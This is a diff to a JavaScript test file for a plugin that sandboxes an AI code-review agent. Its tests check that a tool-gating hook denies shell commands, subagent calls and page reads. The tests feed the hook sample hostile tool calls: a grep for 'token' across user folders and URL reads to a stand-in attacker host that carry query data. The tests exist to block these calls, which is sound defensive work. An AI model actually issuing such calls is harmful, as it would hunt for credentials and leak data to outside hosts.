@@ -8,7 +8,8 @@ import {
   setRunReviewForTest,
   PRIMARY_REVIEW_MODEL,
   FALLBACK_REVIEW_MODEL,
-  GATED_TOOLS
+  GATED_TOOLS,
+  REVIEW_GATED_TOOLS
 } from "../scripts/gemini-companion.mjs";
 import {
   ConfigError,
@@ -543,18 +544,27 @@ test("the run gets the whole --timeout-ms budget", async () => {
   assert.deepEqual(timeouts, [600000]);
 });
 
-test("review runs agy with a hook that denies every command, also plain ls, and every subagent", async () => {
+test("review runs agy with a hook that denies every command, subagent and page read", async () => {
   let cwd;
   setRunReviewForTest(async (args) => {
     cwd = args.cwd;
     // Run the hook the way agy does, from the hooks.json in the temp folder.
     const hooks = JSON.parse(fs.readFileSync(path.join(cwd, ".agents", "hooks.json"), "utf8"));
     const [group] = hooks["gemini-plugin-command-gate"].PreToolUse;
-    assert.equal(group.matcher, GATED_TOOLS);
+    assert.equal(group.matcher, REVIEW_GATED_TOOLS);
+    // A review needs only web search: page reads leave with the rest.
+    for (const tool of ["run_command", "invoke_subagent", "schedule", "read_url_content", "open_browser_url"]) {
+      assert.match(tool, new RegExp(group.matcher), tool);
+    }
+    for (const tool of ["search_web", "finish"]) {
+      assert.doesNotMatch(tool, new RegExp(group.matcher), tool);
+    }
     const calls = [
       { name: "run_command", args: { CommandLine: "ls /tmp" } },
       { name: "run_command", args: { CommandLine: "grep -rn token /Users" } },
-      { name: "invoke_subagent", args: { Prompt: "x" } }
+      { name: "invoke_subagent", args: { Prompt: "x" } },
+      { name: "read_url_content", args: { Url: "https://attacker.example/?q=claim" } },
+      { name: "open_browser_url", args: { Url: "https://attacker.example/" } }
     ];
     for (const toolCall of calls) {
       const out = execFileSync("sh", ["-c", group.hooks[0].command], { input: JSON.stringify({ toolCall }), encoding: "utf8" });
@@ -566,9 +576,14 @@ test("review runs agy with a hook that denies every command, also plain ls, and 
   assert.deepEqual(JSON.parse(out).deniedActions, [
     { action: "command", display_name: "ls /tmp" },
     { action: "command", display_name: "grep -rn token /Users" },
-    { action: "invoke_subagent" }
+    { action: "invoke_subagent" },
+    { action: "read_url_content" },
+    { action: "open_browser_url" }
   ]);
   assert.equal(fs.existsSync(cwd), false, "the temp folder is removed");
+  // Ask keeps its page reads.
+  assert.doesNotMatch("read_url_content", new RegExp(GATED_TOOLS));
+  assert.doesNotMatch("open_browser_url", new RegExp(GATED_TOOLS));
 });
 
 test("review refuses --cwd, which would skip the gated temp folder, without calling agy", async () => {
@@ -589,7 +604,7 @@ test("focus text after -- is focus text, also when it starts with --cwd=, and th
   setRunReviewForTest(async (args) => {
     seen = args;
     const hooks = JSON.parse(fs.readFileSync(path.join(args.cwd, ".agents", "hooks.json"), "utf8"));
-    assert.match(hooks["gemini-plugin-command-gate"].PreToolUse[0].hooks[0].command, /'no-commands'$/);
+    assert.equal(hooks["gemini-plugin-command-gate"].PreToolUse[0].matcher, REVIEW_GATED_TOOLS);
     return okPayload;
   });
   await captureStdout(() => handleReview(["--json", "--", "--cwd=/tmp check dates"], { stdin: "claim body" }));
